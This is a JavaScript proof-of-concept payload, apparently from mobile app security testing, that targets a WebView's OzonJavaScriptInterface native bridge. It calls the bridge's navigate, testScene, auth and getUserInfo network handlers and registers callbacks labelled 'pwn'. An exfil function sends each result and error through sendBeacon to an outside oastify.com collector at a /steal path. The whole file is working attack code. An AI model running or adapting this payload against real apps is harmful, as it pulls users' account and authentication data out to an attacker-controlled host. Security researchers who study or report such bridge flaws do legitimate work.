alert('new_script');
window.native_bridge = window.native_bridge || { callbacks: {} };

function exfil(tag, data) {
    navigator.sendBeacon('https://qqk2nunxt7h2s5ayq68eopdd147vvpje.oastify.com/steal?tag=' + tag, 
        typeof data === 'object' ? JSON.stringify(data) : String(data));
}

try {
    var nav = OzonJavaScriptInterface.callSync("bxHandlers", "navigate", "{}");
    exfil("navigate_response", nav);
} catch(e) { exfil("navigate_err", e.message); }

try {
    var scene = OzonJavaScriptInterface.callSync("bxHandlers", "testScene", "{}");
    exfil("testScene", scene);
} catch(e) { exfil("testScene_err", e.message); }

var callbackId = "pwn-" + Math.random().toString(36).substr(2);
window.native_bridge.callbacks[callbackId] = {
    success: function(r) { exfil("auth_success", r); },
    failure: function(e) { exfil("auth_fail", e); }
};
try {
    OzonJavaScriptInterface.call("bxHandlers", "auth", callbackId, "{}");
} catch(e) { exfil("auth_err", e.message); }

var cbNet = "net-" + Math.random().toString(36).substr(2);
window.native_bridge.callbacks[cbNet] = {
    success: function(r) { exfil("network_response", r); },
    failure: function(e) { exfil("network_fail", e); }
};
try {
    OzonJavaScriptInterface.call("bxHandlers", "asyncNetworkRequest", cbNet,
        JSON.stringify({endpoint: "getUserInfo", body: {}}));
} catch(e) { exfil("network_err", e.message); }
